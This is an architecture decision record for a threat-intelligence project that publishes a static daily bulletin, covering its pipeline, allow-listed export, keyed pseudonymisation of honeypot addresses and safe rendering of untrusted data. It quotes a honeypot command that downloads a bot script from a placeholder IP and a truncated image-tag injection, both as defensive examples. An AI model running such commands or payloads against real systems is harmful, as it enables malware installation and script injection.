# ADR 0010 — Publishing a static bulletin to GitHub Pages

- **Status:** Accepted
- **Date:** 2026-09-16

## Context

Everything AEGIS produces so far is visible only to someone who clones the
repository, starts Docker and runs the pipeline. For a portfolio, and for the
project to be worth anything to a reader, the findings have to be visible at a
URL.

Phase 8 was originally planned as "FastAPI + Next.js real-time dashboard". Two
facts make that the wrong shape here:

1. **A server costs money and attention.** FastAPI plus a database running
   continuously is not free anywhere, and a portfolio link that is down because
   a free instance was reclaimed is worse than no link.
2. **The data changes a few times a day, not a few times a second.** CISA
   updates KEV a few times a week; URLhaus publishes a rolling window. A
   WebSocket delivering a table that changed yesterday is theatre.

Constraint: publishing is public. Anything exported is readable by anyone,
forever, including by people whose IP addresses the honeypot recorded.

## Decision

**Publish a static bulletin to GitHub Pages, rebuilt daily by GitHub Actions.**

```
GitHub Actions (daily, on a clean runner)
  Redpanda + MinIO + Postgres in Docker
  -> aegis collect all --to kafka
  -> aegis lake sync all          (Iceberg Bronze)
  -> aegis model build            (dbt Silver + Gold)
  -> aegis ml campaigns / ransomware
  -> aegis publish export         (allow-listed JSON)
  -> GitHub Pages
```

The whole pipeline runs for real on every publish, on a machine that starts
empty. That is a stronger claim than any screenshot: if the project cannot be
rebuilt from nothing, the workflow fails and yesterday's bulletin stays up,
with its age shown on the page.

### The export is an allow list

`aegis publish export` builds each file from an explicit SELECT of named
columns. Nothing is exported by default, so a new column in a Silver model
stays private until someone adds it here deliberately. Every payload is built
before any file is written, so a refusal leaves the previous bulletin intact
rather than mixing fresh and stale numbers.

### Two kinds of data, two rules

| Data | Rule | Why |
|---|---|---|
| CISA KEV, URLhaus, Feodo, Tor | published as received | their publishers share them for exactly this purpose; a blocklist with hidden addresses is useless |
| Honeypot sessions | keyed pseudonyms only | an address that attacked our sensor is personal data under the GDPR, and AEGIS collected it first-hand |

Honeypot rules, enforced in code:

- **HMAC-SHA256 with a secret key**, not a plain hash. There are only ~4.3
  billion IPv4 addresses: hashing all of them takes minutes, so an unkeyed hash
  is reversible by brute force. The key lives in a GitHub Actions secret.
- **Addresses inside free text are redacted** — a command like
  `wget http://198.51.100.9/bot.sh` becomes `wget http://[ip]/bot.sh`.
- **No key, no export.** If honeypot sessions exist and the key is missing, the
  export fails rather than publishing raw addresses.
- **A final scan** rejects the whole export if anything IP-shaped survives.

### The page is static, and treats its own data as hostile

Malware tags, URL paths and honeypot commands are written by attackers. The
dashboard inserts every value with `textContent`, never `innerHTML`, so a tag
named `<img onerror=...>` is displayed as text instead of running on the page.
Links to indicators are never clickable.

The page needs no build step: HTML, CSS and one JavaScript file. Nothing can
break between the export and the page beyond what a JSON file contains.

### Honest by construction

Each model's output is shown beside its evaluation, read from MLflow: the
ransomware watch list carries "PR-AUC 0.28 against a chance level of 0.12"; the
campaigns carry the 131x subnet lift that validates them. A stale bulletin
labels itself with its age instead of looking current.

## Consequences

- **Positive:** a public URL that costs nothing, cannot be hacked in the usual
  sense (there is no server), and proves the pipeline reproducibly runs from an
  empty machine every day.
- **Positive:** pseudonymisation is now a tested module, so Phase 9's
  governance work starts from a working piece rather than a promise.
- **Negative:** the data is up to 24 hours old. Live streaming would need a
  server, which is Phase 10's cloud phase if it ever justifies the cost.
- **Negative:** the honeypot section will stay a placeholder until the sensor
  is deployed.
- **Negative:** the public repository exposes the commit history. The commit
  email was rewritten to a GitHub noreply address before the first push;
  nothing else in the history is private (verified by scanning every commit).
